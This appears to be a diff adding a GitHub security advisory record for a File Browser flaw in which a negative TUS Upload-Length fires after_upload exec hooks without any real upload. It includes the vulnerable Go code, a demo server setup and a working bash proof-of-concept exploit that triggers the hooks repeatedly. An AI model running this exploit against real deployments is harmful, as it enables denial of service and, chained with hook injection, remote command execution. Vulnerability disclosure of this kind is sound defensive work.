@@ -1,0 +1,49 @@
+{
+  "id": "GHSA-ffx7-75gc-jg7c",
+  "modified": "2026-03-16T20:46:20.990441Z",
+  "published": "2026-03-16T20:43:29Z",
+  "aliases": [
+    "CVE-2026-32759"
+  ],
+  "summary": "File Browser TUS Negative Upload-Length Fires Post-Upload Hooks Prematurely",
+  "details": "## Summary\nThe TUS resumable upload handler parses the `Upload-Length` header as a signed 64-bit integer without validating that the value is non-negative. When a negative value is supplied (e.g. `-1`), the first PATCH request immediately satisfies the completion condition (`newOffset \u003e= uploadLength` → `0 \u003e= -1`), causing the server to fire `after_upload` exec hooks with a partial or empty file. An authenticated user with upload permission can trigger any configured `after_upload` hook an unlimited number of times for any filename they choose, regardless of whether the file was actually uploaded - with zero bytes written.\n\n## Details\n\n**Affected file:** `http/tus_handlers.go`\n\n**Vulnerable code - POST (register upload):**\n```go\nfunc getUploadLength(r *http.Request) (int64, error) {\n    uploadOffset, err := strconv.ParseInt(r.Header.Get(\"Upload-Length\"), 10, 64)\n    // ← int64: accepts -1, -9223372036854775808, etc.\n    if err != nil {\n        return 0, fmt.Errorf(\"invalid upload length: %w\", err)\n    }\n    return uploadOffset, nil\n}\n\n// In tusPostHandler:\nuploadLength, err := getUploadLength(r)   // uploadLength = -1 (attacker-supplied)\ncache.Register(file.RealPath(), uploadLength)  // stores -1 as expected size\n```\n\n**Vulnerable code - PATCH (write chunk):**\n```go\n// In tusPatchHandler:\nnewOffset := uploadOffset + bytesWritten  // 0 + 0 = 0 (empty body)\nif newOffset \u003e= uploadLength {            // 0 \u003e= -1 → TRUE immediately!\n    cache.Complete(file.RealPath())\n    _ = d.RunHook(func() error { return nil }, \"upload\", r.URL.Path, \"\", d.user)\n    // ← after_upload hook fires with empty or partial file\n}\n```\n\n**The completion check uses signed comparison.** Any negative `uploadLength` is always less than `newOffset` (which starts at 0), so the hook fires on the very first PATCH regardless of how many bytes were sent.\n\n**Consequence:** An attacker with upload permission can:\n1. Initiate a TUS upload for any filename with `Upload-Length: -1`\n2. Send a PATCH with an empty body (`Upload-Offset: 0`)\n3. `after_upload` hook fires immediately with a 0-byte (or partial) file\n4. Repeat indefinitely - each POST+PATCH cycle re-fires the hook\n\nIf exec hooks are enabled and perform important operations on uploaded files (virus scanning, image processing, notifications, data pipeline ingestion), they will be triggered with attacker-controlled filenames and empty file contents.\n\n## Demo Server Setup\n\n```bash\ndocker run -d --name fb-tus \\\n  -p 8080:80 \\\n  -v /tmp/fb-tus:/srv \\\n  -e FB_EXECER=true \\\n  filebrowser/filebrowser:v2.31.2\n\nADMIN_TOKEN=$(curl -s -X POST http://localhost:8080/api/login \\\n  -H 'Content-Type: application/json' \\\n  -d '{\"username\":\"admin\",\"password\":\"admin\"}')\n\n# Configure a visible after_upload hook\ncurl -s -X PUT http://localhost:8080/api/settings \\\n  -H \"X-Auth: $ADMIN_TOKEN\" \\\n  -H 'Content-Type: application/json' \\\n  -d '{\n    \"commands\": {\n      \"after_upload\": [\"bash -c \\\"echo HOOK_FIRED: $FILE $(date) \u003e\u003e /tmp/hook_log.txt\\\"\"]\n    }\n  }'\n```\n\n## PoC Exploit\n\n```bash\n#!/bin/bash\n# poc_tus_negative_length.sh\n\nTARGET=\"http://localhost:8080\"\n\n# Login as any user with upload permission\nTOKEN=$(curl -s -X POST \"$TARGET/api/login\" \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"username\":\"attacker\",\"password\":\"Attack3r!pass\"}')\n\necho \"[*] Token: ${TOKEN:0:40}...\"\n\nFILENAME=\"/trigger_test_$(date +%s).txt\"\n\necho \"[*] Step 1: POST TUS upload with Upload-Length: -1\"\ncurl -s -X POST \"$TARGET/api/tus$FILENAME\" \\\n  -H \"X-Auth: $TOKEN\" \\\n  -H \"Upload-Length: -1\" \\\n  -H \"Content-Length: 0\" \\\n  -v 2\u003e\u00261 | grep -E \"HTTP|Location\"\n\necho \"\"\necho \"[*] Step 2: PATCH with empty body (uploadOffset=0 \u003e= uploadLength=-1 → hook fires)\"\ncurl -s -X PATCH \"$TARGET/api/tus$FILENAME\" \\\n  -H \"X-Auth: $TOKEN\" \\\n  -H \"Upload-Offset: 0\" \\\n  -H \"Content-Type: application/offset+octet-stream\" \\\n  -H \"Content-Length: 0\" \\\n  -v 2\u003e\u00261 | grep -E \"HTTP|Upload\"\n\necho \"\"\necho \"[*] Checking hook log on server (/tmp/hook_log.txt)...\"\necho \"[*] If hook fired, you will see entries like:\"\necho \"    HOOK_FIRED: /srv/trigger_test_XXXX.txt \u003ctimestamp\u003e\"\n\necho \"\"\necho \"[*] Repeating 5 times to demonstrate unlimited hook triggering...\"\nfor i in $(seq 1 5); do\n  FNAME=\"/spam_hook_$i.txt\"\n  curl -s -X POST \"$TARGET/api/tus$FNAME\" \\\n    -H \"X-Auth: $TOKEN\" \\\n    -H \"Upload-Length: -1\" \\\n    -H \"Content-Length: 0\" \u003e /dev/null\n  \n  curl -s -X PATCH \"$TARGET/api/tus$FNAME\" \\\n    -H \"X-Auth: $TOKEN\" \\\n    -H \"Upload-Offset: 0\" \\\n    -H \"Content-Type: application/offset+octet-stream\" \\\n    -H \"Content-Length: 0\" \u003e /dev/null\n  \n  echo \"  Hook trigger $i sent\"\ndone\necho \"[*] Done - 5 hooks fired with 0 bytes uploaded.\"\n```\n\n## Impact\n\n**Exec Hook Abuse (when `enableExec = true`):** An attacker can trigger any `after_upload` exec hook an unlimited number of times with attacker-controlled filenames and empty file contents. Depending on the hook's purpose, this enables:\n\n- **Denial of Service:** Triggering expensive processing hooks (virus scanning, transcoding,\n  ML inference) with zero cost on the attacker's side.\n- **Command Injection amplification:** Combined with the hook injection vulnerability\n  (malicious filename + shell-wrapped hook), each trigger becomes a separate RCE.\n- **Business logic abuse:** Triggering upload-driven workflows (S3 ingestion, database inserts,\n  notifications) with empty payloads or arbitrary filenames.\n\n**Hook-free impact:** Even without exec hooks, a negative `Upload-Length` creates an inconsistent cache entry. The file is marked \"complete\" in the upload cache immediately, but the underlying file may be 0 bytes. Any subsequent read expecting a complete file will receive an empty file.\n\n**Who is affected:** All deployments using the TUS upload endpoint (`/api/tus`). The `enableExec` flag amplifies the impact from cache inconsistency to remote command execution.\n\n## Resolution\n\nThis vulnerability has not been addressed, and has been added to the issue tracking all security vulnerabilities regarding the command execution (https://github.com/filebrowser/filebrowser/issues/5199). Command execution is **disabled by default for all installations** and users are warned if they enable it. This feature is **not to be used in untrusted environments** and we recommend to **not use it**.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "github.com/filebrowser/filebrowser/v2",
+        "purl": "pkg:golang/github.com/filebrowser/filebrowser/v2"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "last_affected": "2.61.1"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/03/GHSA-ffx7-75gc-jg7c/GHSA-ffx7-75gc-jg7c.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/filebrowser/filebrowser/security/advisories/GHSA-ffx7-75gc-jg7c"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/filebrowser/filebrowser/issues/5199"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/filebrowser/filebrowser"
+    }
+  ]
+}
